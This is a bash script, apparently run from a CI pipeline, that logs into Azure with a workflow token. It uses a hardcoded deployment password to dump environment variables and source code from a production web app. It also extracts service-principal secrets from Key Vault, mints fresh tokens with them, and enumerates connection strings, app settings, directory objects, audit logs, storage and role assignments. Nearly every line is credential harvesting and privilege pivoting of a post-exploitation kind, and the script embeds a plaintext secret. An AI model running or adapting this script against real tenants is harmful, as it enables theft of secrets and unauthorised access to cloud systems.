#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE="https://management.azure.com"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)
KUDU_USER='$app-tbl-reporting-prod'
KUDU_PASS='Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A'

echo "=== KUDU COMMAND API - ALL ENV VARS ==="
curl -sS -X POST "https://app-tbl-reporting-prod.scm.azurewebsites.net/api/command" \
  -u "$KUDU_USER:$KUDU_PASS" \
  -H "Content-Type: application/json" \
  -d '{"command":"env","dir":"/home/site/wwwroot"}' | python3 -c '
import sys,json
d=json.load(sys.stdin)
out=d.get("Output","")
err=d.get("Error","")
if err: print("STDERR:",err[:500])
for line in out.split("\n"):
    print(line)
' 2>/dev/null | head -c 8000

echo ""
echo "=== KUDU VFS - REPORTING APP SOURCE FILES ==="
echo "--- wwwroot listing ---"
curl -sS "https://app-tbl-reporting-prod.scm.azurewebsites.net/api/vfs/site/wwwroot/" \
  -u "$KUDU_USER:$KUDU_PASS" | python3 -c '
import sys,json
try:
    items=json.load(sys.stdin)
    for it in (items if isinstance(items,list) else []):
        print(it.get("mime",""), it.get("name",""), it.get("size",""))
except: print(sys.stdin.read()[:1000])
' 2>/dev/null

echo ""
echo "--- Read app.py ---"
curl -sS "https://app-tbl-reporting-prod.scm.azurewebsites.net/api/vfs/site/wwwroot/app.py" \
  -u "$KUDU_USER:$KUDU_PASS" 2>/dev/null | head -c 5000

echo ""
echo "--- Read main.py ---"
curl -sS "https://app-tbl-reporting-prod.scm.azurewebsites.net/api/vfs/site/wwwroot/main.py" \
  -u "$KUDU_USER:$KUDU_PASS" 2>/dev/null | head -c 5000

echo ""
echo "--- Read requirements.txt ---"
curl -sS "https://app-tbl-reporting-prod.scm.azurewebsites.net/api/vfs/site/wwwroot/requirements.txt" \
  -u "$KUDU_USER:$KUDU_PASS" 2>/dev/null | head -c 1000

echo ""
echo "--- Find all .py files ---"
curl -sS -X POST "https://app-tbl-reporting-prod.scm.azurewebsites.net/api/command" \
  -u "$KUDU_USER:$KUDU_PASS" \
  -H "Content-Type: application/json" \
  -d '{"command":"find /home/site/wwwroot -name \"*.py\" 2>/dev/null","dir":"/"}' | python3 -c '
import sys,json
d=json.load(sys.stdin)
print(d.get("Output","")[:3000])
' 2>/dev/null

echo ""
echo "=== KUDU PROCESS ENV - GET IDENTITY ENDPOINT ==="
curl -sS "https://app-tbl-reporting-prod.scm.azurewebsites.net/api/processes/1" \
  -u "$KUDU_USER:$KUDU_PASS" | python3 -c '
import sys,json
d=json.load(sys.stdin)
env=d.get("environment_variables",{})
print("Process env keys:", len(env))
for k,v in env.items():
    print(f"  {k}={str(v)[:200]}")
' 2>/dev/null | head -c 6000

echo ""
echo "=== REPORTING APP CONNECTION STRINGS VIA ARM ==="
RS_RAW=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal 2>/dev/null)
RS_CID=$(echo "$RS_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
RS_SEC=$(echo "$RS_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
RS_AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$RS_CID" --data-urlencode "client_secret=$RS_SEC" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "scope=https://management.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)

echo "--- listConnectionStrings ---"
curl -sS -X POST \
  "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/connectionstrings/list?api-version=2023-01-01" \
  -H "Authorization: Bearer $RS_AT" -H "Content-Length: 0" | head -c 3000

echo ""
echo "--- listApplicationSettings (full, unfiltered) ---"
curl -sS -X POST \
  "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2023-01-01" \
  -H "Authorization: Bearer $RS_AT" -H "Content-Length: 0" | head -c 5000

echo ""
echo "=== REPORTING APP HTTP RESPONSE ==="
curl -sS -I "https://app-tbl-reporting-prod.azurewebsites.net/" 2>/dev/null | head -20
curl -sS "https://app-tbl-reporting-prod.azurewebsites.net/" 2>/dev/null | head -c 2000
curl -sS "https://app-tbl-reporting-prod.azurewebsites.net/health" 2>/dev/null | head -c 500
curl -sS "https://app-tbl-reporting-prod.azurewebsites.net/api" 2>/dev/null | head -c 500

echo ""
echo "=== DIRECTORY-AUDIT GRAPH ACCESS + LOOK UP d2cdf247 ==="
DA_RAW=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name directory-audit-principal 2>/dev/null)
DA_CID=$(echo "$DA_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
DA_SEC=$(echo "$DA_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
DA_GRAPH=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$DA_CID" --data-urlencode "client_secret=$DA_SEC" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "scope=https://graph.microsoft.com/.default" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token","ERR:"+d.get("error_description","")[:80]))' 2>/dev/null)
echo "DA Graph token len=${#DA_GRAPH}"

if [ "${#DA_GRAPH}" -gt 100 ]; then
  echo "--- d2cdf247 identity lookup ---"
  curl -sS "https://graph.microsoft.com/v1.0/directoryObjects/d2cdf247-9319-40cb-8324-5a005ef538da" \
    -H "Authorization: Bearer $DA_GRAPH" | head -c 1000
  echo ""

  echo "--- List all service principals (first 30) ---"
  curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=id,appId,displayName&\$top=30" \
    -H "Authorization: Bearer $DA_GRAPH" | python3 -c '
import sys,json
d=json.load(sys.stdin)
err=d.get("error",{})
if err: print("ERR:", err.get("code",""), err.get("message","")[:300])
else:
    for sp in d.get("value",[]):
        print(sp.get("id","")[:8], sp.get("appId","")[:8], sp.get("displayName",""))
' 2>/dev/null

  echo ""
  echo "--- List all apps (registrations) ---"
  curl -sS "https://graph.microsoft.com/v1.0/applications?\$select=id,appId,displayName&\$top=30" \
    -H "Authorization: Bearer $DA_GRAPH" | python3 -c '
import sys,json
d=json.load(sys.stdin)
err=d.get("error",{})
if err: print("ERR:", err.get("code",""), err.get("message","")[:300])
else:
    for a in d.get("value",[]):
        print(a.get("id","")[:8], a.get("appId","")[:8], a.get("displayName",""))
' 2>/dev/null

  echo ""
  echo "--- Audit log query (last 10 events) ---"
  curl -sS "https://graph.microsoft.com/v1.0/auditLogs/directoryAudits?\$top=10&\$select=id,activityDisplayName,initiatedBy,result,targetResources" \
    -H "Authorization: Bearer $DA_GRAPH" | python3 -c '
import sys,json
d=json.load(sys.stdin)
err=d.get("error",{})
if err: print("ERR:", err.get("code",""), err.get("message","")[:300])
else:
    for log in d.get("value",[]):
        print(log.get("activityDisplayName",""), log.get("result",""))
        for t in log.get("targetResources",[]):
            print("  target:", t.get("displayName",""), t.get("id",""))
' 2>/dev/null
fi

echo ""
echo "=== ARCHIVE STORAGE - ANONYMOUS ACCESS ==="
curl -sS "https://sttblarchiveprodx3euoz.blob.core.windows.net/?comp=list&include=metadata" | head -c 3000

echo ""
echo "=== UAMI ROLE ASSIGNMENTS VIA REPORTING-SERVICE ==="
UAMI_OID="f64d08c7-aa34-42d2-8099-d6419d53e8fc"
# Query at reporting RG scope (reporting-service has Contributor there)
curl -sS "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'$UAMI_OID'" \
  -H "Authorization: Bearer $RS_AT" | python3 -c '
import sys,json
d=json.load(sys.stdin)
vals=d.get("value",[])
err=d.get("error",{})
if err: print("ERR:", err.get("code",""), err.get("message","")[:200])
else:
    print("UAMI assignments in reporting RG:", len(vals))
    for r in vals:
        role=r["properties"]["roleDefinitionId"].split("/")[-1]
        scope=r["properties"]["scope"]
        print(f"  role={role[:8]} scope={scope[:150]}")
' 2>/dev/null

echo ""
echo "--- UAMI sub-level assignments via RS_AT ---"
curl -sS "$ARM_BASE/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'$UAMI_OID'" \
  -H "Authorization: Bearer $RS_AT" | python3 -c '
import sys,json
d=json.load(sys.stdin)
vals=d.get("value",[])
err=d.get("error",{})
if err: print("ERR:", err.get("code",""), err.get("message","")[:200])
else:
    print("UAMI sub-level assignments:", len(vals))
    for r in vals:
        role=r["properties"]["roleDefinitionId"].split("/")[-1]
        scope=r["properties"]["scope"]
        print(f"  role={role[:8]} scope={scope[:150]}")
' 2>/dev/null

echo "DONE"
